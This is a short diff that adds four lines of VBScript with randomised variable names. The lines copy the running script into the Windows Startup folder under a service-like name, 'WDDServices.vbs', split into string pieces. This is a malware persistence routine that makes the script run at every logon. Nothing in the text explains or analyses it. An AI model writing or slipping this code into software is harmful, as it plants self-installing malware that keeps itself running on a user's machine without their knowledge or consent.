@@ -1,0 +1,4 @@
+set fhEypCBihEJsEyhEvnxnJpphk = wscript.createobject("wscript.shell")
+set MwvCwnvQkkCBJCrJMJkxTsnkn = createobject("scripting.filesystemobject")
+startup = fhEypCBihEJsEyhEvnxnJpphk.specialfolders ("startup") & "\ W" & "DD" & "Services.vbs"
+MwvCwnvQkkCBJCrJMJkxTsnkn.copyfile wscript.scriptfullname,startup ,true
